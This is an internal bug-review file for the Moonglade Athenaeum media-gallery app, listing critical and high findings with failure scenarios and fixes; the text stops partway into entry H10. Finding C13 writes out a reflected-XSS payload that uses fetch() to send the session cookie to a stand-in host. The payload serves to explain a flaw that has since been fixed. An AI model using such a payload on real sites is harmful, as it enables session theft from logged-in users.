# bugreview.md

Adversarial review of **Moonglade Athenaeum**, 2026-07-27. Scope was deliberately narrow:
**the code and `wiki/` only** -- no `docs/`, no `private/`, no `STATE.md`. 30 subsystems,
116 agents. Every finding here was independently re-opened by a second reviewer instructed
to refute it, and survived; 86 raw findings were produced and 5 were refuted and dropped.

This file is git-ignored working material for triage. Delete it once the items are logged.

| Severity | Count | Meaning |
| --- | ---: | --- |
| Critical | 14 | Can lose files, spend credits, or expose the session |
| High | 28 | Breaks core functionality |
| Medium | 35 | Real bug, limited blast radius |
| Low | 4 | Minor or edge-case |
| **Total** | **81** | |

## Repair status — 2026-07-27

**46 of 81 fixed.** Suite: **1311 python + 445 node, 0 failed**
Eight were additionally verified by the owner against the running app: sync curation,
import naming, the picker filter race, the collection filter, priority/turbo, upscale,
LoRA removal and storyboard deletion.

Fixed: `C01`, `C02`, `C03`, `C04`, `C05`, `C06`, `C07`, `C08`, `C09`, `C10`, `C11`, `C12`, `C13`, `C14`, `H01`, `H02`, `H03`, `H04`, `H05`, `H06`, `H07`, `H08`, `H09`, `H10`, `H11`, `H12`, `H13`, `H14`, `H15`, `H16`, `H18`, `H19`, `H20`, `H21`, `H22`, `H23`, `H26`, `L01`, `M08`, `M09`, `M15`, `M22`, `M28`, `M29`, `M33`, `M34`

Every fix above is on `master` and CI is green. The 5 high findings still open
are the ones that need an owner decision, not an implementation -- see their entries.

### Known related groups (same defect, more than one review angle)

- `C03` / `C06` -- external `--import-local` basename collision
- `C08` / `C12` -- panel job check-then-act race (helper side and route side)
- `C04` / `H09` / `C05` -- purge / catalog-row left inconsistent when the local step fails

### Proposed repair batches

Findings tagged with a batch letter are mechanically similar and can be fixed together.

- **A** -- output escaping & redirect safety
  - `C11`, `C13`, `L01`, `M08`, `M15`
- **B** -- purge must not clear the catalog when the file survived
  - `C04`, `C05`, `H09`
- **C** -- check-then-act races (use the locks already declared)
  - `C08`, `C12`, `M09`, `M22`, `M29`
- **D** -- stale async responses in the pickers (apply the _costSeq idiom)
  - `H20`, `H22`, `M28`
- **E** -- submit/enable state in the generate hub
  - `C09`, `H13`, `H19`, `H21`, `M33`

---


## CRITICAL

### ~~`C01` moonglade_backup.py:1649~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Metadata embedding writes to a `.part` temp then atomically replaces.
- **Area:** Backup & Import
- **Category:** data-loss
- **Batch:** -

**What it is.** embed_metadata() re-saves PNG/JPEG images directly over the original file path with no temp-file/atomic-replace safety net, unlike every other on-disk writer in this file.

**How it fails.** During `python moonglade_backup.py --organize --embed-metadata` (a documented wiki workflow) over a large library, a disk-full condition, Ctrl-C, or an AV file lock interrupts `im.save(path, ...)` on one image. Since `Image.save()` truncates `path` (the sole on-disk copy of that backed-up image) before finishing the write, the original bytes are destroyed and replaced by a zero-byte/truncated file with no recovery path — contrast with convert_image() in the same file, which deliberately writes to a separate out_path and cleans up on failure specifically to avoid this.

### ~~`C02` moonglade_backup.py:4238~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `--sync-videos` merges through `carry_local_fields` instead of upserting blank rows. OWNER-TESTED.
- **Area:** Backup & Import
- **Category:** data-loss
- **Batch:** -

**What it is.** run_sync_videos builds every video's catalog row from an all-blank template and upserts it without merging over existing local curation via carry_local_fields(), so rating/collections/art_tags/title/is_published/aes_score/blurhash are silently wiped on every re-run.

**How it fails.** User runs --sync-videos, then rates a synced video 5 stars and adds it to a 'Favorites' collection in the gallery. Later they generate a new i2v clip and re-run --sync-videos to pick it up; the function rescans the WHOLE feed (not just new tasks) and rebuilds a fresh blank-template row for every task including already-downloaded ones ('skip' status still builds and appends `full`), then save_catalog's ON CONFLICT DO UPDATE SET {f}=excluded.{f} overwrites every column -- the earlier rating and collection membership vanish with no warning printed.

### ~~`C03` moonglade_backup.py:4494~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Imports are content-addressed `<stem>_local_<hash>.<ext>`; existing imports migrate, carrying rating/collections/title. OWNER-TESTED.
- **Area:** Backup & Import
- **Category:** data-loss
- **Batch:** -

**What it is.** run_import_local's external-import path names the destination by basename only (dest = dest_dir / p.name) and skips the copy whenever that basename already exists on disk, without ever comparing bytes, so a differently-content file sharing a basename with an already-imported file is silently never copied while still being reported as imported.

**How it fails.** `--import-local <DIR>` (or the gallery's ↑ Import drop-zone / zip upload, which feeds the same function via api_import_local) over a tree containing 2020/IMG_0001.jpg and 2021/IMG_0001.jpg -- two different photos, a very common camera-filename-counter collision. The first copies to imported/IMG_0001.jpg and catalogs fine; for the second, dest.exists() is already True so shutil.copy2 is skipped entirely, yet the code proceeds to catalog it as if it succeeded (or, on a later separate run, reports it as 'already cataloged'). The second photo's actual bytes are never written anywhere and no error or collision warning is ever shown; the printed 'Imported N new local file(s)' overstates what was actually saved.

### ~~`C04` moonglade_gallery.py:2692~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `purge_media_local()` no longer swallows a failed move/unlink -- it raises OSError and leaves the catalog row intact, so the file is never orphaned. Tests added to tests/test_purge.py.
- **Area:** Deleting & Trash
- **Category:** data-loss
- **Batch:** B

**What it is.** purge_media_local() deletes the catalog row unconditionally even when the file move (or hard-delete unlink) failed, orphaning the file outside any tracked location.

**How it fails.** Deleting an image whose file is momentarily locked (AV scan, sync-client lock, open handle) or that lives on a different volume than out_dir/_deleted (making img.replace(dest) a cross-device rename, which raises OSError on Windows) triggers the `except OSError: pass` at line 2679-2680, leaving `moved = None` and the file still sitting at its original path. Execution falls through regardless and line 2692 (`delete_from_catalog(db_path, media_id)`) runs anyway, wiping the catalog row. The file is now an untracked orphan: not shown in the gallery (no catalog row), not in `_deleted/` (move never happened), so it is invisible to list_quarantined/restore_quarantined_media too. This directly contradicts Deleting.md's guarantee that 'Local files are recoverable... Both buttons move your files to a `_deleted/` folder... and clear the catalog row' and the analogous cloud-delete pattern the same doc describes ('the local copy is only removed once it succeeds') -- here the catalog row is removed even though the local move did not succeed. The same unconditional delete_from_catalog also fires when the hard-delete branch's img.unlink() (line 2683) fails, with the identical orphaning effect.

### ~~`C05` moonglade_gallery.py:11936~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Each item in the bulk worker is now guarded individually, so one locked file no longer abandons every remaining task.
- **Area:** Deleting & Trash
- **Category:** data-loss / error-handling
- **Batch:** B

**What it is.** delete_tasks_bulk()'s background worker has no per-task guard around the local-purge step, so any exception there (e.g. a concurrent write hitting sqlite's default 'database is locked' error -- this app never sets WAL mode or a busy_timeout anywhere) aborts the whole for-loop, silently abandoning every remaining task and leaving the just-cloud-deleted task's images stranded in the local catalog.

**How it fails.** User selects images from 5 different tasks and clicks 'Delete from PixAI'. Task 1 completes fine. For task 2, core.delete_task_gql() succeeds (irreversible cloud delete), but the very next line, con2 = _connect(db_path) / con2.execute(...) at lines 11936-11940, raises sqlite3.OperationalError because another request (e.g. a thumbnail write, a /rate click, the sync job) is writing catalog.db at that moment -- there's no busy_timeout anywhere in the file. That exception isn't caught by the inner try (which only wraps the delete_task_gql call at 11930-11935); it propagates to the outer except at 11953, which just logs status='failed' with the raw SQL error and returns. Tasks 3, 4 and 5 are never even attempted -- still fully intact on both PixAI and locally -- while task 2's images are permanently gone from PixAI but still show up in the local gallery (catalog row untouched, thumbnail still serves) until the user notices and runs --reconcile-deleted. This directly contradicts the function's own docstring promise ('so cloud and catalog never drift') and the Deleting wiki's claim that a failure leaves the image 'exactly where it was on both sides'.

### ~~`C06` moonglade_backup.py:4495~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Same defect from the parameter side; the id now comes from the file's bytes.
- **Area:** Generating & Cost
- **Category:** data-loss
- **Batch:** -

**What it is.** External --import-local silently drops (never backs up) a second source file that shares a basename with one already copied, while still cataloging it as if it succeeded.

**How it fails.** Run `--import-local <externalDir>` on a folder tree containing two different files with the same basename in different subfolders (e.g. two phone-backup exports each with `Camera/IMG_0001.jpg`, a very common real-world layout). `dest = dest_dir / p.name` collapses both to the same destination path. For the first file, `dest.exists()` is False so it copies; for the second, `dest.exists()` is now True so `shutil.copy2` is SKIPPED (line 4495-4496) and `stored` is set to the first file's already-copied bytes. Because `existing`/`existing_mids` were snapshotted once before the loop (line 4448-4455) and never updated with rows added mid-run, the second file is not recognized as a duplicate: it proceeds to compute the SAME `rel`/`mid` as the first file (line 4500-4504) and appends a second catalog row with an identical media_id but the second file's own mtime/prompt_preview. The second file's actual bytes are permanently lost -- never copied anywhere -- while the CLI reports it as one of the 'Imported N new local file(s)', and the catalog silently ends up with a duplicate-media_id row pointing at the first file's content.

### ~~`C07` moonglade_gallery.py:3480~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Stop/Restart REFUSE with a 409 while a job runs, matching the .jobbtn greying the Panel already did.
- **Area:** Job Tracker & Watcher
- **Category:** data-loss
- **Batch:** -

**What it is.** _schedule_server_exit (the "_die" helper backing Stop/Restart server) hard-kills the Flask process with os._exit() without ever checking or terminating an in-flight Panel maintenance subprocess, so a running destructive job (organize/dedup-delete) is silently orphaned and keeps running unsupervised.

**How it fails.** User clicks 'Dedup — DELETE dupes outright' (destructive, requires confirm); _panel_run (line 3831) spawns a real `moonglade_backup.py --dedup --apply --dedup-delete` child process that starts permanently deleting duplicate files. While it's still mid-run, the user (or anyone on the LAN, since api_server_stop at line 11056 requires only 'any session, local or LAN' per its own docstring) clicks '■ Stop server' or '↻ Restart server'. Both routes call _schedule_server_exit (0 or 42) unconditionally (see lines 11059 and 11145) with zero reference to _panel_job['proc'] -- and _schedule_server_exit is a MODULE-LEVEL function defined before create_app (line 3480), so it has no closure access to _panel_job even if it wanted to check it. After a 0.4s sleep, os._exit(code) (line 3487) kills only the parent; the child dedup-delete subprocess is not part of any job object/process group and keeps running invisibly. If supervised, the relaunched server's startup sweep (resolve_interrupted_local_jobs, lines 3533-3541) marks the job 'Interrupted' in the UI -- and the wiki explicitly tells the user 'Nothing is corrupted when that happens -- just start it again' -- so the user re-runs dedup-delete, now racing a SECOND delete pass against the still-alive orphaned first one on the same catalog/files, with no _duplicates/ safety net and no undo.

### ~~`C08` moonglade_gallery.py:3831~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The job slot is now CLAIMED inside the same lock acquisition that checks it, before any subprocess is spawned; the slot is released if the spawn throws.
- **Area:** Job Tracker & Watcher
- **Category:** race-condition
- **Batch:** C

**What it is.** _panel_run never re-verifies under _panel_lock that no job is already running before mutating the single shared _panel_job dict and launching a new subprocess, so two near-simultaneous /api/panel/run requests (or a scheduler tick racing a manual click) can both pass the caller's check-then-act guard and run concurrently, corrupting job tracking -- directly contradicting the wiki's documented 'One job runs at a time' contract.

**How it fails.** api_panel_run (lines 11201-11203) checks `if _panel_job['status'] == 'running': return 409` and releases _panel_lock before calling _panel_run (line 11207). Two requests arriving within that window (double-click, or two browser tabs firing two different Maintenance buttons) both pass the check while status is still 'idle', and both call _panel_run. The second call's `_panel_job.update(...)` (lines 3865-3868) overwrites the first job's proc/job_id/lines/cancelled with the second job's values. Because _panel_reader (line 3778-3780) reads `jid = _panel_job.get('job_id')` from the shared dict AFTER its thread starts rather than receiving it as a parameter, if the first job's reader thread hasn't executed that line yet when the second call lands, it silently adopts the second job's job_id -- so when the first (possibly destructive, e.g. organize) subprocess finishes, it logs its terminal 'done'/'failed' event under the WRONG job id. The Activity/Job Tracker then shows the first job stuck at 'running' forever while the second job's entry gets a spurious extra completion event -- and both subprocesses keep running concurrently against the same catalog.db/backup folder in the meantime.

### ~~`C09` static/mg-upscale-panel.js:501~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Go and the cost badge now answer to one predicate (`_canSubmit()`), so a disabled ratio can no longer fire a paid call.
- **Area:** Pickers & Drawer
- **Category:** money
- **Batch:** E

**What it is.** The Go button and the actual submit path never check `this._ratio.disabled`, so when the ratio slider is disabled (image already at PixAI's pixel ceiling, or `window.MG_UPSCALE` consts missing on the page) the panel still fires a real, paid `/api/generate` call that upscales nothing.

**How it fails.** Open the Upscale panel on an image that's already at PixAI's output-pixel ceiling for the chosen mode. `_syncRatio()` (line 310) sets `this._ratio.disabled = true` and shows 'This picture is already at PixAI's ceiling for Upscale.'; `_price()` (line 479) then silently returns without ever calling `/api/price`, so the cost badge is left on its idle 'The cost appears once this image has a model.' hint. `_paintModel()` (line 337) never touches `_go.disabled` for this case, so Go is still clickable. Clicking it runs `_submit()` (line 499-533), whose only guard (line 501) is `!this.src.model_id` — it happily POSTs `_payload()` with `enlarge:null`/`upscale:null` (line 452, 466-473) to `/api/generate`, which server-side is an ordinary i2i re-generation at ref_strength 0.55: the user pays real credits for a plain regenerate that produces neither an upscale nor any price warning beforehand. The same gap fires whenever `maxRatio()` returns 0 (missing/short `window.MG_UPSCALE.ceiling`), not just the at-ceiling case.

### ~~`C10` moonglade_backup.py:704~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Read-only is re-read from config.json, stat-gated so the spend path stays cheap. Turning it ON now applies to a running server.
- **Area:** Security & Access
- **Category:** guard-bypass
- **Batch:** -

**What it is.** READ_ONLY is captured once into a module-level global at import time and never re-read, so _check_read_only() (line 739) enforces a stale snapshot for the entire lifetime of a running process.

**How it fails.** The owner runs the long-lived web gallery (`python moonglade_gallery.py`, the documented primary usage mode) and, while it's already running, edits config.json to add `"READ_ONLY": true` -- exactly the 'cautious first run'/handoff scenario the code's own docstring at line 696-704 describes ('a trust signal for anyone nervous about handing a third-party tool spend/delete access'). Because `_cfg = _load_config()` (line 695) and `READ_ONLY = bool(_cfg.get(...))` (line 704) only ever execute once at import, and nothing in the file reloads them, every subsequent generate/edit/video/hand-fix submission, task delete, or reward claim routed through `_check_read_only()` on that running server still succeeds and spends credits/deletes data -- silently contradicting the documented promise that READ_ONLY overrides --confirm/--apply/--yes 'CLI and web alike'. Only restarting the process picks up the new value.

### ~~`C11` moonglade_gallery.py:8751~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `back` now goes through the new `_safe_back()`, which reduces to path+query and defers to the existing `_safe_next()`. Verified: `?back=javascript:...` no longer reaches the page.
- **Area:** Security & Access
- **Category:** xss-open-redirect
- **Batch:** A

**What it is.** The `back` query parameter on the detail page is reflected unsanitized into an href and into a JS location.href assignment, allowing a javascript: URI to execute in the authenticated app context.

**How it fails.** detail() sets `back = request.args.get("back", url_for("index"))` with no validation (unlike the login page's `next`, which is run through `_safe_next()` requiring a leading `/`). DETAIL_HTML then renders `<a id="nav-gallery" ... href="{{ back }}">` (line 8751) and, in deleteFromPixai(), `location.href = {{ back|tojson }};` (line 8963). A link such as `/image/<media_id>?back=javascript:...` causes the injected script to run as the logged-in user the moment they click '↑ Gallery' or press Escape/ArrowUp (both wired to that same href by the keydown handler at lines 8726-8742) — giving the script full access to the live session to make authenticated calls (delete image, trigger panel jobs, change account settings) or to redirect the victim to a phishing page.

### ~~`C12` moonglade_gallery.py:11201~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `api_panel_run` now relies on `_panel_run`'s atomic claim and maps a refused claim to the same 409 contract.
- **Area:** Security & Access
- **Category:** race-condition
- **Batch:** C

**What it is.** api_panel_run() checks "a job is already running" and starts the maintenance subprocess in two separate, unlocked steps, so two near-simultaneous POSTs can both pass the check and launch two maintenance jobs concurrently -- violating the app's own "one job runs at a time" guarantee (documented in wiki/Control-Panel.md: "One job runs at a time... a second request comes back with 'a job is already running'").

**How it fails.** The server runs with threaded=True (moonglade_gallery.py:15340), so concurrent requests are genuinely processed in parallel threads. The status check at lines 11201-11203 (`with _panel_lock: if _panel_job["status"] == "running": return 409`) releases the lock before calling `_panel_run(action, ...)` at line 11207; _panel_run() does not itself acquire _panel_lock and flip status to "running" until after `subprocess.Popen(...)` has already been created (moonglade_gallery.py lines 3858-3868). If two POSTs to /api/panel/run land within that window -- an owner double-clicking a Maintenance button, or two open tabs both firing the request -- both see status=="idle" and both start their own subprocess. Two concurrent `--organize` (or `--dedup --apply`) runs then race on the same catalog.db and the same files: per api_panel_cancel's own docstring, an interrupted organize "leaves files physically moved on disk while catalog.db still points at their old paths" -- the same corruption class occurs here from two writers instead of one cancelled one, with no lock protecting the catalog/file operations across the two subprocesses.

### ~~`C13` moonglade_gallery.py:12904~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `/contact-sheet` now escapes the collection name, media ids and caption dates via markupsafe. Verified: a `<script>` collection name comes back escaped.
- **Area:** Security & Access
- **Category:** xss
- **Batch:** A

**What it is.** The /contact-sheet route builds its response HTML with plain Python str.format() (no Jinja autoescape, no markupsafe.escape) and drops the raw ?collection= query parameter straight into the page's <title> and <h1>, producing a reflected XSS.

**How it fails.** An attacker sends any already-logged-in Moonglade session (owner or a LAN account added via Panel -> Users) a link like /contact-sheet?collection=<img src=x onerror=fetch('//evil.example/x?c='+document.cookie)>. contact_sheet() (lines 12901-12904) sets title = 'Collection: ' + collection unescaped, then interpolates it verbatim into the returned HTML at lines 12967 (<title>) and 12981 (<h1>) via .format() -- there is no render_template/Jinja escaping anywhere in this route. The payload executes in the app's own origin with the victim's session, letting the attacker exfiltrate the session cookie or fire authenticated fetch() calls against any other route (spend credits, bulk-delete images, etc.) as that user.

### ~~`C14` loom/master-storyboard.jsx:2470~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The delete walks the survivors and aborts before removing anything if none read.
- **Area:** The Loom
- **Category:** data-loss
- **Batch:** -

**What it is.** Deleting the active storyboard can silently overwrite a different, untouched storyboard's saved data with a blank template if the read of the survivor project hiccups.

**How it fails.** User has 2+ storyboards open in the switcher and deletes the currently-active one. deleteProject picks a survivor ('next') and does `let p = null; try { const raw = await sGet(PPRE + next.id); if (raw) p = JSON.parse(raw); } catch {}` (line 2470) — any failure (network blip, storage error, malformed stored JSON) is silently swallowed and `p` stays null. Line 2473 then does `setActiveId(next.id); setProject(p || seedProject())`, making a brand-new blank project the in-memory state for `next.id`. Because `project`/`activeId` changed, the file's own 600ms debounced autosave effect fires shortly after and writes that blank `seedProject()` to `PPRE + next.id` in storage — permanently clobbering the survivor project's real acts/shots/cast with no error ever shown to the user, and no way to tell it happened until they reopen that project and find it empty.


## HIGH

### ~~`H01` moonglade_backup.py:1799~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** download() reports a disk error instead of letting a bare OSError escape -- callers without an on_error were dropping the file silently and reporting success.
- **Area:** Backup & Import
- **Category:** error-handling
- **Batch:** -

**What it is.** download()'s try/except only catches requests exceptions, so a plain OSError from disk I/O (full disk, or _atomic_replace's own documented PermissionError after exhausting retries) escapes uncaught, and callers using _parallel_map without on_error silently drop the file with zero indication.

**How it fails.** Disk fills up mid-run: `fh.write(chunk)` at line 1760 raises `OSError: [Errno 28] No space left on device`, which is not a requests.RequestException so it isn't caught here. It propagates out of download(); at a call site like the video-fetch loop (~line 4107) that passes no `on_error` to `_parallel_map`, the exception becomes a bare `None` result that matches none of the caller's `ok/skip/missing/fail` branches — the file silently disappears from every success/fail count with no printed error at all.

### ~~`H02` moonglade_backup.py:1861~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** task_detail_gql retries like every other query, so a blip after a CHARGED generation stops reporting 'no media ids found'. Safe because it is a read-only query; the no-retry rule protects mutations from paying twice.
- **Area:** Backup & Import
- **Category:** correctness
- **Batch:** -

**What it is.** task_detail_gql() makes a single non-retried, non-logged request, so a transient HTTP hiccup right after a paid generation completes produces the misleading error "task completed but no media ids found" instead of retrying or telling the user their generation and credits are safe.

**How it fails.** User runs `--generate --confirm` (or `--generate-video --confirm`); the task completes and is charged, but the immediately-following task_detail_gql() GET (used to fetch outputs) hits a transient timeout/5xx from PixAI's own busy servers right after task completion. task_detail_gql returns None silently (not even under -v), the caller computes zero media ids, and raises "task completed but no media ids found" — indistinguishable from a real failure, with no hint that `--task-id <id>` would recover it for free.

### ~~`H03` moonglade_backup.py:7011~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** match_kaisuuken's enrich path keeps its fail-soft contract -- a ConnectionError or malformed body used to escape mid --confirm.
- **Area:** Backup & Import
- **Category:** error-handling
- **Batch:** -

**What it is.** match_kaisuuken's enrich=True path calls list_kaisuukens() outside the function's own try/except, so any exception it doesn't itself swallow (i.e. anything other than PixAIError -- a network ConnectionError/Timeout from the raw `session.get()` in `_rest_get`, or a JSON-decode ValueError from a malformed 200 body) escapes uncaught, breaking the documented fail-soft/raise_on_error contract for every enrich=True caller.

**How it fails.** During a --confirm spend, _apply_kaisuuken (line 7285) calls match_kaisuuken(session, params, enrich=True, raise_on_error=True) in a loop (lines 7308-7316) whose except clause only catches `(PixAIError, ValueError)` -- specifically built so a transient glitch aborts cleanly with 'Lost to the Void -- nothing was spent, try again' instead of silently spending credits. If the /kaisuuken/summary call inside list_kaisuukens hits a plain network hiccup (ConnectionError/Timeout, not wrapped as PixAIError), that exception is not caught by list_kaisuukens (which only catches PixAIError), not caught by match_kaisuuken (whose only try/except at lines 7001-7007 wraps just the earlier /kaisuuken/check POST), and not caught by _apply_kaisuuken's retry loop -- so instead of the deliberately engineered safe-abort message, the CLI crashes with a raw unhandled exception mid-spend-flow. The same gap fires on the read-only price-preview route in moonglade_gallery.py line 14040 (`core.match_kaisuuken(gsession, params, enrich=True)`, called with the default raise_on_error=False): a network blip there is caught only by the route's outer try/except (line 14045), discarding the already-computed `cost` from line 14039 and returning a bare error to the Generate/Loom drawer's cost badge -- exactly the 'glitched check should not block the UI' failure the docstring says can't happen. The test suite's `_no_live_card_network` fixture (tests/conftest.py lines 85-98) only ever injects `PixAIError` for `_rest_get`/`_rest_post`, so this gap is untested and would not be caught by CI.

### ~~`H04` moonglade_backup.py:8306~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** run_download's single-worker loop counts tasks, not pages, so --collect-only stops overshooting --max and prints a true total.
- **Area:** Backup & Import
- **Category:** correctness
- **Batch:** -

**What it is.** In run_download's non-parallel loop, `seen` (the task counter that gates --max and is printed as the final 'Tasks seen' total) is incremented by 1 per PAGE instead of per task, unlike the parallel branch which correctly does `seen += len(edges)`.

**How it fails.** Run `python moonglade_backup.py --collect-only --max 40` (the Wiki's Download-tuning table states `--collect-only` 'also forces single-worker mode', which routes into this exact code path; the same bug is also hit with an explicit `--workers 1 --max 40`, and `--workers 1` is documented in --help as '1 = serial/polite'). With the default `--page-size 250`, the loop only increments `seen` once per full page of up to 250 tasks, so `if args.max and seen >= args.max: break` doesn't fire until ~40 pages have been processed -- i.e. up to ~10,000 tasks instead of the 40 the user asked for via the documented 'small test download' flag. The final 'Done. Tasks seen: N' summary is also wrong (reports page count, not task count) for any serial run.

### ~~`H05` moonglade_similar.py:263~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** scan_dir matches its exclusions against the path UNDER root. A library beneath any folder named gallery/_duplicates/_deleted was silently indexing NOTHING.
- **Area:** Catalog & Misc
- **Category:** correctness
- **Batch:** -

**What it is.** scan_dir()'s directory exclusion checks the file's ENTIRE absolute path (Path.parts includes every ancestor from the drive root), not just the portion under `root`, so an ancestor folder that happens to be named "gallery", "_duplicates", or "_deleted" anywhere above the backup folder silently excludes every image from indexing.

**How it fails.** Backup lives at e.g. D:\Photos\Gallery\pixai_backup and the owner runs a fresh similarity build via `sync(scan_dir(root))` with root="D:\Photos\Gallery\pixai_backup". Every yielded path's `p.parts` includes "Gallery" as a component, so `excluded_dirs & {q.lower() for q in p.parts}` is non-empty for literally every file, `scan_dir` yields zero (media_id, path) pairs, `sync()` inserts 0 rows, and count()/similar() report an empty or perpetually-empty index with no exception raised anywhere -- the whole 'more like this' feature goes silently dark for that install and there's no error to point at the cause.

### ~~`H06` moonglade_gallery.py:2937~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Restoring a legacy quarantined VIDEO now derives is_video from the file when the purge-time sidecar cannot (there are ~12k pre-sidecar files in _deleted/), so it no longer returns as a broken image.
- **Area:** Deleting & Trash
- **Category:** correctness
- **Batch:** -

**What it is.** restore_quarantined_media() rebuilds the catalog row purely from the (possibly absent) purge-time sidecar, so restoring a legacy quarantined video with no sidecar reinserts it with is_video left blank instead of '1'.

**How it fails.** The module's own docstring (lines 2750-2751, 2795-2797) states `_deleted/` holds ~12k legacy files from before the 2026-07-24 sidecar feature, with no sidecar JSON. Restoring one of those pre-existing quarantined VIDEOS from the Trash panel: `_read_trash_meta` returns None -> `meta = None` -> line 2937 builds `row = {f: '' for f in CATALOG_FIELDS}`, so `row['is_video']` is '' rather than '1' (unlike list_quarantined at line 2843, which independently derives is_video from the file suffix -- restore_quarantined_media does not do the same derivation). Every is_video-gated code path elsewhere in this module (templates checking `row.is_video == '1'`, video-serving routes gated on `row.get('is_video') == '1'`) will now treat the restored .mp4/.webm as a plain still image: no play badge, no video route, and the detail page attempting to open it as an image. The user restores a video expecting it back and gets a silently misclassified, effectively broken item with no error shown.

### ~~`H07` moonglade_gallery.py:3086~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** build_thumbnails()'s video fallback now passes the video extensions -- it was searching image extensions, so it could never find the video it existed to thumbnail.
- **Area:** Deleting & Trash
- **Category:** silent-failure
- **Batch:** -

**What it is.** build_thumbnails()'s video-thumbnail fallback calls find_files_for_media_id() without exts=_VIDEO_EXTS, so it defaults to _IMAGE_EXTS and can never actually find the video file it's searching for.

**How it fails.** For a video row whose primary path `Path(out_dir)/filename` doesn't exist (stale filename after a reorg, or an empty filename), line 3085's `if not vp.exists()` triggers the fallback at line 3086: `find_files_for_media_id(Path(out_dir), mid)` with no `exts` argument. Per that function's own docstring in this same file (lines 2543-2548), the default is `_IMAGE_EXTS`, and callers must explicitly pass `exts=_VIDEO_EXTS` (as moonglade_backup.py's already_downloaded_video does) to match video files. Since .mp4/.webm/.mov/.mkv/.m4v are never in `_IMAGE_EXTS`, the search always returns `[]`, `vp` becomes None, and `make_video_thumbnail` is never invoked -- even though the video file may exist elsewhere under out_dir and would have been found with the right extension set. The video silently gets no poster thumbnail, and every subsequent `--sync` / 'Rebuild thumbnails' pass repeats the same no-op lookup and never fixes it.

### ~~`H08` moonglade_gallery.py:5652~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Drag-paint only paints for the primary button. A right-click (a documented feature) was silently toggling the card into the selection that 'Delete from PixAI' acts on.
- **Area:** Deleting & Trash
- **Category:** selection-integrity
- **Batch:** -

**What it is.** Select-mode drag-paint doesn't filter by mouse button, so a right-click (meant only to open the image context menu) also silently toggles the card into/out of the persisted cross-page selection that CloudDel later deletes from PixAI.

**How it fails.** User turns on 'Select' mode (select-mode-btn), selects 8 images across two pages for a bulk 'Delete from PixAI', then right-clicks a 9th, unselected image to check '✧ Similar' (a documented right-click feature, wired via the separate 'contextmenu' listener). The 'pointerdown' handler at line 5652 has no e.button check, so it fires for the right button too: paintVal = !paintSet.has(mid) is true for that unselected card, so paint(card) adds it to paintSet, and pointerup (endPaint) immediately persists it via selSave(paintSet) -- all before the context menu is even read. If the user proceeds to 'Delete from PixAI' without re-scrutinizing every thumbnail in the CloudDel preview (or if the preview API is unreachable and the 'blind()' fallback's plain confirm() with no per-item breakdown is shown), the extra image's whole task gets irreversibly deleted from PixAI even though the user never consciously selected it.

### ~~`H09` moonglade_gallery.py:11700~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `api_delete_image()` catches the new OSError and returns it through the route's own JSON contract instead of a 500.
- **Area:** Deleting & Trash
- **Category:** data-loss / error-handling
- **Batch:** B

**What it is.** api_delete_image() calls purge_media_local() unguarded immediately after a successful cloud delete, so any exception in the local purge (same sqlite-lock class of failure as above) leaves the image permanently deleted on PixAI while still present in the local catalog, and returns an ugly 500 instead of the route's own designed JSON-error contract.

**How it fails.** A logged-in-at-the-console user deletes a single image via the detail page. core.delete_batch_media_gql(...) succeeds at line 11697 (image is now gone from PixAI, irreversible), but purge_media_local(out_dir, thumb_dir, db_path, mid, row.get('filename')) at line 11700 throws (e.g. catalog.db momentarily locked by a concurrent request) before delete_from_catalog() runs. The exception is not caught anywhere in this view function, so Flask returns an unhandled 500 instead of the route's normal jsonify({'error': ...}) shape, and the catalog row + thumbnail for that image are never removed -- the gallery keeps showing an image that no longer exists on the user's PixAI account, exactly the cloud/catalog drift this route's own docstring says the ordering is designed to prevent.

### ~~`H10` moonglade_backup.py:4937~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Reference-video gates audio flags on VIDEO_AUDIO_MODELS, the same table the i2v builder uses -- it was re-introducing the false-NSFW refusal that table exists to prevent.
- **Area:** Generating & Cost
